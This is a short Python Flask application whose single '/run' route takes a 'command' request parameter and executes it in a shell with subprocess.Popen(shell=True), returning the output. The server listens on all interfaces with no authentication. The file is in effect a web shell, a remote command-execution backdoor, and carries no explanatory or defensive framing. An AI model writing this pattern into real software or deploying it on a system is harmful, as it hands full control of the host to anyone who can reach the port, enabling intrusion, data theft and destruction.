import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route("/run")
def run():
    return subprocess.Popen(request.values.get("command"), shell=True, stdout=subprocess.PIPE).stdout.read()

app.run(host="0.0.0.0", port=8000)